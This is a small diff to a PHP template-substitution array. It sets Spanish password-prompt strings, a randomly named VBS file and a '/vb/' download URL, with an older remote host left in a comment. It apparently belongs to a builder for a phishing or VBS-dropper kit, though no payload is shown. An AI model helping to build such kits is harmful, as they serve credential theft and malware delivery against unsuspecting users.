@@ -22,7 +22,7 @@ $data = [
     "{{CONST8}}" => "Introduce la contrasena",
     "{{CONST9}}" => "Contrasena",
     "{{VBS_NAME}}" => randName(8) . ".vbs",
-    "{{URL}}" => getenv('BASE_URL_WITHOUT_HTTP')
+    "{{URL}}" => getenv('BASE_URL_WITHOUT_HTTP')."/vb/"
     // "{{URL}}" => "80.32.109.208.host.secureserver.net/vb/"
 ];
 
